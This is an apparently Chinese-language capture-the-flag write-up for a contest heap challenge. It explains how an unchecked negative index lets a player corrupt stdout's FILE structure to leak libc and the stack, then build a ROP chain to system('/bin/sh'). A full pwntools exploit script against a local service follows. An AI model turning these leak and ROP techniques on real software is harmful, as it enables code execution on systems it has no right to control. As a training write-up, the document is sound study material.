临时出的一道防AK的，这次校赛题出简单了，反省

洞很简单，就是idx没查负数

## Leak

利用idx=-8改stdout

* \_flags=0xfbad1887，改stdout的缓冲方式
* \_IO_write_base改到stdout的\_chain，输出stdin的地址，用的libc stdout的最低字节为0x03，改一字节改不到，改两字节需要爆破十六分之一

## ROP

用和Leak一样的方法可以泄漏_environ来获取栈地址，然后在栈上写ROP链

*之前遇到这种情况我都是打IO，非常麻烦，之前看别人的wp可以直接打栈，简简又单单🤡*

## EXP

* 先申请idx为8的chunk再delete，令size[-8]=note[8]=0xdead，再改stdout泄漏libc和_environ
* 申请idx为0xf的chunk，这是为了伪造size
* 申请idx为-1，size为stack（要写rop链的地址）的chunk，令size[-1]=note[0xf]=stack
* 改idx为0xf的chunk就能rop了

有十六分之一的爆破，多打几遍，看你运气：）

```python
from pwn import *
context.log_level='debug'
context.os='linux'
context.arch='amd64'


def add(idx,size):
    p.sendlineafter(b'>> ',b'1')
    p.sendlineafter(b'Index: ',str(idx).encode())
    p.sendlineafter(b'Size: ',str(size).encode())

def delete(idx):
    p.sendlineafter(b'>> ',b'2')
    p.sendlineafter(b'Index: ',str(idx).encode())

def edit(idx,content):
    p.sendlineafter(b'>> ',b'3')
    p.sendlineafter(b'Index: ',str(idx).encode())
    p.sendafter(b'Content: ',content)

p=remote('127.0.0.1',9999)
libc=ELF('./libc.so.6')
add(8,0x10)
delete(8)
payload=p64(0xfbad1887)+p64(0)*3+b'\xe8\x47'
edit(-8,payload)
libcbase=u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))-libc.symbols['_IO_2_1_stdin_']
print(hex(libcbase))
environ=libcbase+libc.symbols['_environ']
edit(-8,p64(0xfbad1887)+p64(0)*3+p64(environ)+p64(environ+8))
stack=u64(p.recvuntil(b'\x7f').ljust(8,b'\x00'))-0x140
print(hex(stack))
add(0xf,0x200)
add(-1,stack)
rdi=libcbase+0x2a3e5
binsh=libcbase+next(libc.search(b'/bin/sh\x00'))
system=libcbase+libc.symbols['system']
ret=libcbase+0x29139
payload=p64(ret)+p64(rdi)+p64(binsh)+p64(system)
edit(0xf,payload)
p.interactive()
```
